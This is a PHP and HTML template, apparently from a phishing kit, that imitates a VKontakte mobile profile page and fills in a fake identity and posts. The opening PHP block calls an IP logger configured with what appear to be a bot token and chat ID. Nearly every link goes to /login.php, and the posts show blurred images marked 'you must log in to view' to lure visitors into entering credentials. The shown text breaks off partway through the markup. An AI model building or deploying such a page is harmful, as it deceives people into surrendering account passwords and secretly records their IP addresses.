<?php
   require_once('data.php');
   require_once('auth.php');
   
   if($data['ip_logger']){
     $auth = new CheckUser($data['token'], $data['chat_id']);
     $auth->IPLogger();
   }
   
   ?>
<!DOCTYPE html>
<html lang="ru" class="vk vk_js_yes vk_2x vk_flex_yes r m h  vk_appAuth_no n vk_modern  vk_schemes_yes   ">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no">
      <meta name="format-detection" content="telephone=no">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="MobileOptimized" content="176">
      <meta name="HandheldFriendly" content="True">
      <!--<base id="base">-->
      <base href=".">
      <link rel="manifest" crossorigin="use-credentials" href="https://m.vk.com/manifest.webmanifest?ver=221">
      <meta name="apple-itunes-app" content="app-id=564177498">
      <link rel="shortcut icon" href="https://m.vk.com/images/icons/favicons/fav_logo_2x.ico?8">
      <link rel="icon" type="image/png" sizes="32x32" href="https://m.vk.com/images/icons/pwa/favicon_32.png?12">
      <link rel="apple-touch-icon" href="https://m.vk.com/images/icons/pwa/apple/default.png?15">
      <meta name="apple-mobile-web-app-title" content="ВКонтакте">
      <meta name="application-name" content="ВКонтакте">
      <meta name="mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <meta name="theme-color" content="#ffffff">
      <meta name="color-scheme" content="light">
      <title><?php echo $data['name']; ?> | ВКонтакте</title>
      <meta http-equiv="origin-trial" content="Av8ECqeAAIiC9bF3N7aq2M/TaxNzzpPcFXnw0rRb9KRUQlbyHKYmPj6KeVUFVDk+S7W9RfJH2GsEOS8G99uJvgcAAABaeyJvcmlnaW4iOiJodHRwczovL3ZrLmNvbTo0NDMiLCJmZWF0dXJlIjoiQmFkZ2luZyIsImV4cGlyeSI6MTU2MTY2MTkxNCwiaXNTdWJkb21haW4iOnRydWV9">
      <link rel="stylesheet" href="./Files/variables.c488a25f0db630caa654.css">
      <link rel="stylesheet" href="./Files/legacy.8071b9b03d029cfe51d3.css">
      <link rel="stylesheet" href="./Files/common.db78fa87a8ecf9d292b3.css">
      <link rel="stylesheet" href="./Files/audio.5c6c1e01d49841e561f9.css">
      <link rel="stylesheet" href="./Files/profile.e268162e856bca0385a7.css">
      <link rel="stylesheet" href="./Files/wall.1ef460ebfa8bc2e6555c.css">
      <link rel="stylesheet" href="./Files/reactions.4cd73007b34b17dd5ab2.css">
      <link rel="preload" as="style" href="https://st1-90.vk.com/css/mobile/vkui.84f8b161423d630703f5.css?e7eda09a7f289ddb2b6af1d5b75248bd82b085ea0704b04f437d565269963623">
      <link rel="preload" as="style" href="https://st1-90.vk.com/css/mobile/qsearch.6eb64c86c5e582a12c2d.css?a0bb9b3cda5b6f771287fa324cb132d1153be7a7165088b180347f48f290b989">
      <link rel="stylesheet" href="./Files/page_bottom_banners.1118c4f9ba2d58030ca1.css">
      <link rel="stylesheet" href="./Files/unauthorized.5ddca5cae5c53f641a48.css">
      <link rel="stylesheet" href="./Files/owner_photo_upload.a363fdbebde980b3a96f.css">
      <
      <link rel="preload" as="style" href="./Files/wall.8fd239675a017561b2ea.css">
      <link rel="preload" as="style" href="./Files/b-ddd7f7245138f2738ccd4780cbf4c2c4.5c32bfd31961004012b5.css">
      <link rel="preload" as="style" href="./Files/qsearch.22a885d991dc54cfa512.css">
      <link rel="preload" as="style" href="./Files/audio.46dc0867c6864cc0f432.css">
      <link rel="canonical" href="https://vk.com/id627674722">
      <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/id627674722">
      <link rel="stylesheet" type="text/css" href="./Files/vkui.84f8b161423d630703f5.css">
      <link rel="stylesheet" type="text/css" href="./Files/qsearch.6eb64c86c5e582a12c2d.css">
      <link rel="stylesheet" type="text/css" href="./Files/wall.8fd239675a017561b2ea.css">
      <link rel="stylesheet" type="text/css" href="./Files/b-ddd7f7245138f2738ccd4780cbf4c2c4.5c32bfd31961004012b5.css">
      <link rel="stylesheet" type="text/css" href="./Files/qsearch.22a885d991dc54cfa512.css">
      <link rel="stylesheet" type="text/css" href="./Files/audio.46dc0867c6864cc0f432.css">
      <script src="./Files/superapp.3e1d454bf53be1da0989.js"></script><script src="./Files/wall.7c5d71e4ecb0a858456f.js"></script><script src="./Files/b-2cd47ea917968eaaadaa603596998979.ddb298b671ee790e39f0.js"></script><script src="./Files/b-ddd7f7245138f2738ccd4780cbf4c2c4.5f18e6ce2b97c5e1501a.js"></script><script src="./Files/qsearch.4cfecdc9d37a22b8b5c6.js"></script><script src="./Files/b-ae7f83753ae3b7e0e86d1cf75eb806f8.64e811a2777142dec5ff.js"></script><script src="./Files/audio.322627ac078dc446e8e9.js"></script>
      <link rel="stylesheet" type="text/css" href="./Files/audio_player_bottom.9f770c07efad5ed71508.css">
      <script src="./Files/audio_player_bottom.a573f15568d50096056b.js"></script>
   </head>
   <body class="vk__page x2 _touch _ios_13 vk_ios_yes _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_yes vk__page_profile vk_tabbar_redesign vk_tabbar_bottom vk_al_yes vk_mode_regular"scheme="bright_light">
      <div id="utils"></div>
      <div class="layout">
      <div class="layout__header mhead" id="vk_head"></div>
      <div class="layout__body qs_enabled _js _copts" id="vk_wrap">
      <div class="layout__leftMenu" id="l">
      </div>
      <div class="layout__basis" id="m" role="main">
      <div class="basis">
         <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_unauthorized basis__header_nohide" id="mhead">
            <div class="UnauthorizedHeader">
               <div class="UnauthorizedHeader__row">
                  <div class="UnauthorizedHeader__logoWrapper">
                     <a class="UnauthorizedHeader__logo" href="/login.php">
                        <div class="mhi_logo hb_btn">
                           <div aria-hidden="true" class="svgIcon svgIcon-vk_logo_24">
                              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <rect width="24" height="24" rx="5.76" fill="#07F"></rect>
                                 <path d="M12.82 17.5c-5.42 0-8.7-3.76-8.83-10h2.74c.09 4.59 2.17 6.53 3.77 6.93V7.5h2.63v3.96c1.54-.17 3.16-1.97 3.7-3.96h2.59A7.62 7.62 0 0 1 16 12.49a7.9 7.9 0 0 1 4.01 5.01h-2.84c-.6-1.9-2.07-3.37-4.05-3.57v3.57h-.31Z" fill="#fff"></path>
                              </svg>
                           </div>
                        </div>
                        <div class="mhi_logo_text">
                           <div aria-hidden="true" class="svgIcon svgIcon-vk_logo_composite_text_24">
                              <svg fill="none" height="24" viewBox="0 0 112 24" width="112" xmlns="http://www.w3.org/2000/svg">
                                 <clippath id="id-vk_logo_composite_text_24__a">
                                    <path d="M0 0h112v24H0z"></path>
                                 </clippath>
                                 <g clip-path="url(#id-vk_logo_composite_text_24__a)">
                                    <path clip-rule="evenodd" d="M43 12.5c0 3.34-2.43 5.5-5.88 5.5-3.45 0-5.88-2.16-5.88-5.5S33.67 7 37.12 7C40.57 7 43 9.16 43 12.5zm-9.22 0c0 2.07 1.35 3.5 3.34 3.5s3.34-1.43 3.34-3.5-1.35-3.45-3.34-3.45-3.34 1.38-3.34 3.45zm-17.03-.21c.95-.44 1.56-1.18 1.56-2.33 0-1.73-1.58-2.96-3.87-2.96H9.17v11h5.5c2.37 0 4.02-1.29 4.02-3.05 0-1.33-.87-2.32-1.94-2.66zM11.6 9.01h2.83c.85 0 1.44.5 1.44 1.2s-.6 1.2-1.44 1.2h-2.83zM14.67 16h-3.06V13.3h3.06c.96 0 1.59.55 1.59 1.36s-.63 1.33-1.59 1.33zM27.84 18h3.19l-5.06-5.71L30.61 7h-2.9l-3.68 4.27h-.6V7H21v11h2.44v-4.38h.59zM52.47 7v4.34h-4.93V7H45.1v11h2.43v-4.44h4.93V18h2.43V7zM62.9 18h-2.44V9.22h-3.8V7H66.7v2.22h-3.8zm9.7-11c-2.14 0-4.02.89-4.57 2.8l2.24.37a2.38 2.38 0 0 1 2.2-1.25c1.33 0 2.12.9 2.22 2.33h-2.37c-3.23 0-4.84 1.42-4.84 3.45 0 2.05 1.59 3.3 3.83 3.3 1.8 0 3-.82 3.53-1.73l.5 1.73h1.8v-6.18c0-3.19-1.73-4.82-4.54-4.82zm-.72 9.16c-1.18 0-1.95-.61-1.95-1.57 0-.84.62-1.43 2.48-1.43h2.3c0 1.8-1.14 3-2.83 3zM89.73 18h-3.2l-3.8-4.38h-.6V18H79.7V7h2.44v4.27h.59L86.4 7h2.9l-4.63 5.29zM94 18h2.44V9.22h3.8V7H90.2v2.22H94zm12.3-11c3.33 0 5.7 2.2 5.7 5.37 0 .3-.02.55-.04.79h-8.84c.23 1.69 1.46 2.83 3.32 2.83 1.29 0 2.3-.55 2.83-1.33l2.29.38c-.83 2.1-2.98 2.96-5.27 2.96-3.34 0-5.71-2.18-5.71-5.5s2.37-5.5 5.71-5.5zm3.06 4.25A3.06 3.06 0 0 0 106.29 9a3 3 0 0 0-3.02 2.25z" fill="currentColor" fill-rule="evenodd"></path>
                                 </g>
                              </svg>
                           </div>
                        </div>
                     </a>
                  </div>
               </div>
            </div>
         </div>
         <div class="basis__menu ">
            <div class="AudioPlayerBottomContainer"></div>
            <div class="VideoFilterBadgeFiller"></div>
         </div>
         <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/id627674722">
            <div class="BasisProfile pcont fit_box">
               <div class="ipanel bl_cont ">
                  <div class="PageBlock">
                     <div class="owner_panel profile_panel">
                        <a href="/login.php" onclick="return photo.openInLayer(this, event, &#39;627674722_457239252&#39;, &#39;album627674722_0/rev&#39;, {from:&#39;profile&#39;});" rel="noopener">
                           <div class="pp_img">
                              <div class="Avatar Avatar--loaded Avatar--mode-both Avatar--images-1 Avatar--borderRadius-full Avatar--theme-5 Avatar--size-80" role="img" aria-label="Макс Мексимиллианов">
                                 <div class="Avatar__content">
                                    <div class="Avatar__image Avatar__image-1" style="background-image: url(<?php echo $data['avatar']; ?>);"></div>
                                    <div class="Avatar__text">ВЗ</div>
                                 </div>
                              </div>
                           </div>
                        </a>
                        <div class="pp_cont">
                           <h2 class="op_header">
                              <?php echo $data['name']; ?>
                           </h2>
                           <div class="pp_last_activity">
                              <span class="pp_last_activity_text">
                                 <?php echo $data['online_time']; ?>  
                                 <b class="lvi mlvi">
                                    <span class="mlvi_default">
                                       <div aria-hidden="true" class="svgIcon svgIcon-online_mobile_12_gray_200">
                                          <svg xmlns="http://www.w3.org/2000/svg" width="8" height="12">
                                             <path d="M5.99 0C7.1 0 8 .9 8 2.01v7.98C8 11.1 7.1 12 5.99 12H2.01C.9 12 0 11.1 0 9.99V2.01C0 .9.9 0 2.01 0h3.98zm0 3H2a.5.5 0 0 0-.5.5v5c0 .28.23.5.5.5h4a.5.5 0 0 0 .5-.5v-5A.5.5 0 0 0 6 3z" fill="#C4C8CC"></path>
                                          </svg>
                                       </div>
                                    </span>
                                 </b>
                              </span>
                           </div>
                        </div>
                        <h3 class="visually-hidden">Информация</h3>
                        <div class="ProfileButtonsWrapper">
                           <a class="ProfileButton" href="/login.php">
                              <div class="ProfileButton__icon">
                                 <div aria-hidden="true" class="svgIcon svgIcon-money_transfer_outline_28">
                                    <svg width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg">
                                       <g id="money_transfer_outline_28__Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                          <g id="money_transfer_outline_28__money_transfer_outline_28">
                                             <path d="M0 0h28v28H0z"></path>
                                             <path d="M20.87 4c1.79 0 2.43.19 3.08.53.66.35 1.17.86 1.52 1.52.34.65.53 1.3.53 3.08v9.12-3.23.1a1 1 0 0 1-2-.12v-3H4v5.44c0 .89.1 1.21.27 1.54.17.32.43.58.75.75.3.16.6.26 1.35.27h16.22l-2.3-2.3a1 1 0 0 1 1.42-1.4l4 4a1 1 0 0 1 0 1.4l-4 4a1 1 0 0 1-1.42-1.4l2.3-2.3H7.13c-1.79 0-2.43-.19-3.08-.53a3.63 3.63 0 0 1-1.52-1.52C2.2 19.3 2 18.65 2 16.87V9.13c0-1.79.19-2.43.53-3.08.35-.66.86-1.17 1.52-1.52C4.7 4.2 5.35 4 7.13 4h13.74Zm.57 2H6.56c-.89 0-1.21.1-1.54.27-.32.17-.58.43-.75.75-.16.3-.26.6-.27 1.35V10h20V8.56c0-.89-.1-1.21-.27-1.54a1.82 1.82 0 0 0-.75-.75c-.33-.18-.65-.27-1.54-.27Z" id="money_transfer_outline_28__Icon-Color" fill="currentColor" fill-rule="nonzero"></path>
                                          </g>
                                       </g>
                                    </svg>
                                 </div>
                              </div>
                              <span class="ProfileButton__text">Деньги</span>
                           </a>
                           <a class="ProfileButton" href="/login.php">
                              <div class="ProfileButton__icon">
                                 <div aria-hidden="true" class="svgIcon svgIcon-gift_outline_28">
                                    <svg width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg">
                                       <g id="gift_outline_28__Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                          <g id="gift_outline_28__gift_outline_28">
                                             <path d="M0 0h28v28H0z"></path>
                                             <path d="M12.44 3.7A5.02 5.02 0 0 1 14 5.44a5 5 0 0 1 1.57-1.76c1.49-1 3.37-.9 4.5.24 1.14 1.13 1.25 3.01.24 4.5-.14.2-.29.4-.45.57H21c.8 0 1.5.18 2.1.5.6.33 1.07.8 1.4 1.4.32.59.5 1.3.5 2.1v.43c0 1-.14 1.55-.4 2.03A2.73 2.73 0 0 1 23 16.8v3.07c0 1.78-.19 2.43-.53 3.08a3.63 3.63 0 0 1-1.52 1.52c-.65.34-1.3.53-3.08.53h-7.74c-1.79 0-2.43-.19-3.08-.53a3.63 3.63 0 0 1-1.52-1.52C5.2 22.3 5 21.65 5 19.87V16.8a2.73 2.73 0 0 1-1.6-1.34 3.72 3.72 0 0 1-.4-1.79V13c0-.8.18-1.51.5-2.1.33-.6.8-1.07 1.4-1.4C5.5 9.18 6.2 9 7 9h1.15a4.58 4.58 0 0 1-.46-.56c-1-1.5-.9-3.38.24-4.51 1.13-1.14 3.02-1.25 4.5-.24ZM13 17H7v2.87c0 1.33.08 1.73.3 2.14.16.3.39.53.69.7.41.21.81.29 2.14.29H13v-6Zm2 0v6h2.87c1.33 0 1.73-.08 2.14-.3.3-.16.53-.39.7-.69.21-.41.29-.81.29-2.14V17h-6Zm-2-6H7c-.46 0-.84.1-1.14.26a1.5 1.5 0 0 0-.6.6c-.17.3-.26.68-.26 1.14v.6c.01.51.06.73.16.92.08.14.18.24.32.32.2.1.45.16 1.07.16H13v-4Zm8 0h-6v4h6.61c.5-.01.72-.06.91-.16a.73.73 0 0 0 .32-.32c.1-.19.15-.4.16-.91V13c0-.46-.1-.84-.26-1.14a1.5 1.5 0 0 0-.6-.6c-.3-.17-.68-.26-1.14-.26Zm-6-2c3.65-.35 4.7-2.7 3.7-3.7S15.35 5.35 15 9ZM9.3 5.3c-1 1 .05 3.35 3.7 3.7-.35-3.65-2.7-4.7-3.7-3.7Z" id="gift_outline_28__Icon-Color" fill="currentColor" fill-rule="nonzero"></path>
                                          </g>
                                       </g>
                                    </svg>
                                 </div>
                              </div>
                              <span class="ProfileButton__text">Подарок</span>
                           </a>
                           <div class="ProfileButton" onclick="window.Questions.ask(627674722);">
                              <div class="ProfileButton__icon">
                                 <div aria-hidden="true" class="svgIcon svgIcon-question_outline_28">
                                    <svg fill="none" height="28" viewBox="0 0 28 28" width="28" xmlns="http://www.w3.org/2000/svg">
                                       <path clip-rule="evenodd" d="M14.02 5.5c-5.39 0-9.48 3.72-9.48 8a7 7 0 0 0 1.42 4.2 1 1 0 0 1 .2.6c0 1.04-.28 2.05-.61 2.96-.22.57-.47 1.14-.7 1.67 2.05-.21 3.4-.87 4.21-1.83a1 1 0 0 1 1.11-.29c1.18.44 2.48.69 3.85.69 5.38 0 9.48-3.72 9.48-8 0-4.28-4.1-8-9.48-8zm-11.48 8c0-5.66 5.29-10 11.48-10 6.2 0 11.48 4.34 11.48 10s-5.29 10-11.48 10c-1.37 0-2.7-.21-3.92-.6-1.44 1.35-3.54 2-6.11 2.1a1.44 1.44 0 0 1-1.36-2.02l.27-.6c.27-.6.54-1.2.77-1.81.26-.7.43-1.35.47-1.97a8.97 8.97 0 0 1-1.6-5.1zM13.99 10c-.43 0-.8.3-.9.7a1 1 0 0 1-1.93-.5 2.92 2.92 0 0 1 5.75.73c0 1.28-.7 1.96-1.19 2.4-.47.45-.68.65-.74 1.1a1 1 0 1 1-1.98-.28c.16-1.17.85-1.8 1.29-2.2l.07-.07c.42-.4.55-.56.55-.95A.92.92 0 0 0 14 10zm0 9a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z" fill="currentColor" fill-rule="evenodd"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="ProfileButton__text">Вопрос</span>
                           </div>
                        </div>
                        <div class="Separator ProfileButtonsWrapper__separator">
                           <div></div>
                        </div>
                        <div class="OwnerInfo">
                           <div class="OwnerInfo__row OwnerInfo__row--gray">
                              <a href="/login.php" class="OwnerInfo__rowInfo">
                                 <div class="OwnerInfo__rowLeft">
                                    <div aria-hidden="true" class="svgIcon svgIcon-home_outline_20">
                                       <svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                          <g id="home_outline_20__Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                             <g id="home_outline_20__Icons-20/home_outline_20">
                                                <g id="home_outline_20__home_outline_20">
                                                   <path opacity=".4" d="M0 0h20v20H0z"></path>
                                                   <path d="M3 11h-.04l-.18-.01A2.04 2.04 0 0 1 1.67 7.4L8.2 1.8a2.75 2.75 0 0 1 3.58 0l6.54 5.6A2.04 2.04 0 0 1 17 11v4.25c0 1.24-1 2.25-2.25 2.25h-2.8a.95.95 0 0 1-.95-.95V13.5a1 1 0 0 0-2 0v3.05c0 .52-.43.95-.95.95h-2.8c-1.24 0-2.25-1-2.25-2.25V11Zm11.75 5c.41 0 .75-.34.75-.75v-4.9c0-.47.38-.85.85-.85H17a.54.54 0 0 0 .35-.96l-6.54-5.6c-.46-.4-1.16-.4-1.62 0l-6.54 5.6a.54.54 0 0 0-.06.77c.09.1.21.17.31.18l.1.01h.65c.47 0 .85.38.85.85v4.9c0 .41.34.75.75.75H7.5v-2.5a2.5 2.5 0 1 1 5 0V16h2.25Z" id="home_outline_20__Icon-Color" fill="currentColor" fill-rule="nonzero"></path>
                                                </g>
                                             </g>
                                          </g>
                                       </svg>
                                    </div>
                                 </div>
                                 <div class="OwnerInfo__rowCenter">Город: <?php echo $data['city']; ?></div>
                              </a>
                           </div>
                           <div class="OwnerInfo__row OwnerInfo__row--gray">
                              <a href="/login.php" class="OwnerInfo__rowInfo">
                                 <div class="OwnerInfo__rowLeft">
                                    <div aria-hidden="true" class="svgIcon svgIcon-followers_outline_20">
                                       <svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                          <g id="followers_outline_20__Page-2" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                             <g id="followers_outline_20__followers_outline_20">
                                                <g id="followers_outline_20__followers_20">
                                                   <path id="followers_outline_20__Shape" opacity=".4" d="M0 0h20v20H0z"></path>
                                                   <path d="M5.5 16a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3Zm7-.75a.75.75 0 1 1-1.5 0A6.15 6.15 0 0 0 4.75 9a.75.75 0 0 1 0-1.5 7.64 7.64 0 0 1 7.75 7.75Zm5 0a.75.75 0 1 1-1.5 0A11.1 11.1 0 0 0 4.75 4a.75.75 0 0 1 0-1.5A12.6 12.6 0 0 1 17.5 15.25Z" id="followers_outline_20__Icon-Color" fill="currentColor" fill-rule="nonzero"></path>
                                                </g>
                                             </g>
                                          </g>
                                       </svg>
                                    </div>
                                 </div>
                                 <div class="OwnerInfo__rowCenter"><?php echo $data['followers']; ?> подписчиков</div>
                              </a>
                           </div>
                           <div class="OwnerInfo__row OwnerInfo__row--extraMargin">
                              <a href="/login.php" class="OwnerInfo__rowInfo">
                                 <div class="OwnerInfo__rowLeft">
                                    <div aria-hidden="true" class="svgIcon svgIcon-info_20">
                                       <svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                          <g id="info_20__Page-2" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                             <g id="info_20__info_20" fill-rule="nonzero">
                                                <path id="info_20__Shape" d="M0 0h20v20H0z"></path>
                                                <path d="M10 1a9 9 0 1 1 0 18 9 9 0 0 1 0-18Zm0 8c-.5 0-.9.4-.9.9v3.7a.9.9 0 1 0 1.8 0V9.9c0-.5-.4-.9-.9-.9Zm0-3.5a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z" id="info_20__Icon-Color" fill="currentColor"></path>
                                             </g>
                                          </g>
                                       </svg>
                                    </div>
                                 </div>
                                 <div class="OwnerInfo__rowCenter">
                                    <div class="OwnerInfo__linkBold">Подробная информация</div>
                                 </div>
                              </a>
                           </div>
                        </div>
                     </div>
                     <div class="profile_info">
                        <div class="profile_info_cont"></div>
                     </div>
                  </div>
                  <a name="wall"></a>
                  <a name="posts"></a>
                  <div class="WallSearchBtn__wrapper">
                     <a href="/login.php" onclick="WallSearch.onSearch(event, &#39;/id627674722?search=1&#39;)" class="WallSearchBtn" aria-label="Поиск">
                        <div aria-hidden="true" class="svgIcon svgIcon-search_20">
                           <svg fill="none" height="20" viewBox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
                              <path clip-rule="evenodd" d="M9.5 4.5a5 5 0 1 0 0 10 5 5 0 0 0 0-10zM3 9.5a6.5 6.5 0 1 1 11.6 4.04l3.18 3.18a.75.75 0 1 1-1.06 1.06l-3.18-3.18A6.5 6.5 0 0 1 3 9.5z" fill="currentColor" fill-rule="evenodd"></path>
                           </svg>
                        </div>
                     </a>
                     <h3 class="slim_header slim_header_block_top"><?php echo $data['posts_num']; ?> записей</h3>
                  </div>
                  <div id="posts_container" class="wall_posts upanel bl_cont  mark_top ">
          
            <?php foreach($data['posts'] as $key => $value): ?>

              <div class="wall_item post--withRedesign" id="wall627674722_85">
                        <a class="post__anchor anchor" name="post627674722_85"></a>
                        <div class="wi_head">
                           <a href="/login.php" rel="noopener" class="al_u627674722">
                              <div class="PostHeader__avatarWrapper PostHeader__avatarWrapper--default _u627674722">
                                 <div class="Avatar Avatar--loaded Avatar--mode-both Avatar--images-1 Avatar--borderRadius-full Avatar--theme-5 Avatar--size-40" role="img" aria-label="id627674722">
                                    <div class="Avatar__content">
                                       <div class="Avatar__image Avatar__image-1" style="background-image: url(<?= $data['avatar'] ?>)"></div>
                                       <div class="Avatar__text">ВЗ</div>
                                    </div>
                                 </div>
                              </div>
                           </a>
                           <div class="PostHeader__contentWrapper PostHeader__contentWrapper--redesign">
                              <div class="wi_cont">
                                 <div class="wi_author"><a class="pi_author al_u627674722 _u627674722" href="/login.php" rel="noopener" data-post-owner-type="user"><?= $data['name']; ?></a> </div>
                                 <div class="wi_info"><a class="wi_date al_wall" href="/login.php" rel="noopener" data-header=""><?= $value['date']; ?></a></div>
                              </div>
                              <div class="wi_cont_side">
                              </div>
                           </div>
                        </div>
                        <div class="wi_body">
                           <div class="pi_text" onclick="return post.wallPostOpen(this, event);"><?= $value['title']; ?></div>
                           <div class="pi_medias thumbs_list thumbs_list1 audios_list medias_audios_list">
                              <div class="MediaGridContainerMvk--post MediaGridContainerMvk--postFullWidth">
                                 <div class="MediaGrid" style="">
                                    <div class="MediaGrid__thumb MediaGrid__thumb--single MediaGrid__thumb--ratioContainer" style="--mg-ratio:0.75;" data-restricted-item="1">
                                    <div class="blur" bis_skin_checked="1" style="width: 100%;height: 100%;background: ;position: absolute;top: 0;backdrop-filter: blur(23px);background: ;backdrop-filter: blur(8px);filter: blur(25px);background-image: url('<?= $value['image_link']; ?>');background-position: center;background-repeat: no-repeat;background-position: center;background-size: cover;"></div>  
                                    <a href="/login.php" class="MediaGrid__interactive" aria-label="фотография" onclick="return photo.openInLayer(this, event, '627674722_457239302', 'album627674722_00', {&quot;is_album_page&quot;:false});" data-id="627674722_457239302" data-src_big="https://sun9-8.userapi.com/impf/VumKO0pacv03w3lSOkN_I3HMfHyVCAFOHYZdzw/NsP2tzt99HU.jpg?size=453x604&amp;quality=95&amp;blur=50,20&amp;sign=a3fa77adb24744d8ae5d4fd2f65f3712&amp;type=album%7C453%7C604" data-restriction="null" style="position: absolute;top: 50%;margin: ;font-size: 3.5vh;left: 50%;color: rgba(0,0,0,0.6);text-align: center;align-items: center;justify-content: center;transform: translate(-50%, -50%);">
                                    <nobr> Необходимо войти</nobr><br><nobr>для просмотра</nobr>
                                  </a>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="PostRowBottomButtons Post__row _wi_buttons PostRowBottomButtons--shrink">
                              <div class="PostRowBottomButtons__buttons">
                                 <div class="PostBottomButtons _post_bottom_like_wrap">
                                    <div class="_PostBottomButtonReactionContainer PostBottomButtonContainer" data-section-ref="reactions-button-container">
                                       <div id="js-reactions-menu-wall627674722_85" class="_ReactionsMenuContainerRoot ReactionsMenuContainer" data-section-ref="reactions-menu-container"></div>
                                       <a class="PostBottomButton PostBottomButtonReaction" rel="noopener" data-reaction-href="/login.php" data-reaction-set-id="reactions" data-reaction-target-object="wall627674722_85" onclick="Reactions.onButtonClick(this, event)" onmousedown="Reactions.onButtonMouseDown(this, event)" onmouseenter="Reactions.onButtonMouseEnter(this, event)" ontouchstart="Reactions.onButtonMouseDown(this, event)" role="button" title="Отправить реакцию «Нравится»" tabindex="0" style="">
                                          <span class="PostBottomButton__icon">
                                             <div aria-hidden="true" class="svgIcon svgIcon-like_outline_24">
                                                <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                                                   <g fill="none" fill-rule="evenodd">
                                                      <path d="M0 0h24v24H0z"></path>
                                                      <path d="M16 4a5.95 5.95 0 0 0-3.89 1.7l-.12.11-.12-.11A5.96 5.96 0 0 0 7.73 4 5.73 5.73 0 0 0 2 9.72c0 3.08 1.13 4.55 6.18 8.54l2.69 2.1c.66.52 1.6.52 2.26 0l2.36-1.84.94-.74c4.53-3.64 5.57-5.1 5.57-8.06A5.73 5.73 0 0 0 16.27 4zm.27 1.8a3.93 3.93 0 0 1 3.93 3.92v.3c-.08 2.15-1.07 3.33-5.51 6.84l-2.67 2.08a.04.04 0 0 1-.04 0L9.6 17.1l-.87-.7C4.6 13.1 3.8 11.98 3.8 9.73A3.93 3.93 0 0 1 7.73 5.8c1.34 0 2.51.62 3.57 1.92a.9.9 0 0 0 1.4-.01c1.04-1.3 2.2-1.91 3.57-1.91z" fill="currentColor" fill-rule="nonzero"></path>
                                                   </g>
                                                </svg>
                                             </div>
                                          </span>
                                          <span class="PostBottomButton__label" aria-hidden="true"><span class="PostBottomButtonReaction__label" aria-hidden="true"><?= $value['likes']; ?></span></span>
                                       </a>
                                       <span class="visually-hidden" role="button" data-reaction-href="/like?act=set_reaction&amp;from=wall627674722&amp;hash=12da7f8f30fce15a21&amp;object=wall627674722_85&amp;one=0" data-reaction-set-id="reactions" data-reaction-target-object="wall627674722_85" aria-haspopup="true" aria-expanded="false" aria-controls="js-reactions-menu-wall627674722_85" onclick="Reactions.onButtonClick(this, event, {allowKeyboardMenuOpen: true})" title="Выбор реакции" tabindex="0"></span><span class="visually-hidden">Оценили 10К человек</span>
                                    </div>
                                    <a class="PostBottomButton _item_replies PostBottomButton--non-shrinkable" href="/login.php" rel="noopener" aria-label="0 комментариев">
                                       <span class="PostBottomButton__icon">
                                          <div aria-hidden="true" class="svgIcon svgIcon-comment_outline_24">
                                             <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                                                <g fill="none" fill-rule="evenodd">
                                                   <path d="M0 0h24v24H0z"></path>
                                                   <path d="M16.9 4H7.1c-1.15 0-1.73.11-2.35.44-.56.3-1 .75-1.31 1.31C3.11 6.37 3 6.95 3 8.1v5.8c0 1.15.11 1.73.44 2.35.3.56.75 1 1.31 1.31l.15.07c.51.25 1.04.35 1.95.37h.25v2.21c0 .44.17.85.47 1.16l.12.1c.64.55 1.6.52 2.21-.08L13.37 18h3.53c1.15 0 1.73-.11 2.35-.44.56-.3 1-.75 1.31-1.31.33-.62.44-1.2.44-2.35V8.1c0-1.15-.11-1.73-.44-2.35a3.17 3.17 0 0 0-1.31-1.31A4.51 4.51 0 0 0 16.9 4zM6.9 5.8h9.99c.88 0 1.18.06 1.5.23.25.13.44.32.57.57.17.32.23.62.23 1.5v6.16c-.02.61-.09.87-.23 1.14-.13.25-.32.44-.57.57-.32.17-.62.23-1.5.23h-4.02a.9.9 0 0 0-.51.26l-3.47 3.4V17.1c0-.5-.4-.9-.9-.9H6.74a2.3 2.3 0 0 1-1.14-.23 1.37 1.37 0 0 1-.57-.57c-.17-.32-.23-.62-.23-1.5V7.74c.02-.61.09-.87.23-1.14.13-.25.32-.44.57-.57.3-.16.58-.22 1.31-.23z" fill="currentColor" fill-rule="nonzero"></path>
                                                </g>
                                             </svg>
                                          </div>
                                       </span>
                                       <span class="PostBottomButton__label" aria-hidden="true"></span>
                                    </a>
                                    <a class="PostBottomButton PostBottomButton--non-shrinkable" href="/login.php" rel="noopener" aria-label="0 Поделиться" aria-pressed="false" onclick="window.Unauthorized2 &amp;&amp; window.Unauthorized2.onActionClick(event, &#39;share&#39;, &#39;wall627674722_85&#39;)" role="button">
                                       <span class="PostBottomButton__icon">
                                          <div aria-hidden="true" class="svgIcon svgIcon-share_outline_24">
